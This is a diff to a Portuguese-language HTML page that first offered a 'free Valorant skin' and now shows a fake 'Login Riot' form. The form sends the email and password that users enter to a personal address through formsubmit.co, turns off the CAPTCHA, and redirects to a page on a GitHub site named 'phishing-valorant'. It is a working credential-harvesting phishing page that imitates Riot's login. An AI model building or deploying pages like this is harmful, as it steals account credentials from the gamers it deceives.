@@ -1,24 +1,60 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8">
-  <title>Resgate sua Skin Valorant</title>
-  <link rel="stylesheet" href="style.css">
+  <title>Login Riot</title>
+  <style>
+    body {
+      background-color: #0f1923;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    form {
+      background-color: #1c1f26;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(255,255,255,0.1);
+    }
+    input {
+      display: block;
+      width: 100%;
+      margin-bottom: 1rem;
+      padding: 0.5rem;
+      border-radius: 4px;
+      border: none;
+    }
+    button {
+      background-color: #ff4655;
+      color: white;
+      padding: 0.7rem 1rem;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    h1 {
+      text-align: center;
+    }
+  </style>
 </head>
-
 <body>
-  <div class="container">
-    <h2>🎉 Parabéns! Você ganhou uma skin exclusiva do Valorant!</h2>
-    <p>Para resgatar, faça login com sua conta Riot:</p>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="E-mail Riot/Valorant" required><br><br>
-      <input type="password" id="senha" placeholder="Senha" required><br><br>
-      <button type="submit">Resgatar Skin</button>
-    </form>
-    <p id="mensagem"></p>
-  </div>
-  <script src="script.js"></script>
+  <form action="https://formsubmit.co/katiellyscherbatsky@gmail.com" method="POST">
+    <h1>Login Riot</h1>
+    <input type="text" name="email" placeholder="E-mail Riot" required>
+    <input type="password" name="senha" placeholder="Senha" required>
+    
+    <!-- Opcional: redireciona para uma página de agradecimento -->
+    <input type="hidden" name="_next" value="https://katielly-scherbatsky.github.io/phishing-valorant/sucesso.html">
+    
+    <!-- Opcional: ocultar CAPTCHA -->
+    <input type="hidden" name="_captcha" value="false">
+    
+    <button type="submit">Entrar</button>
+  </form>
 </body>
-
 </html>
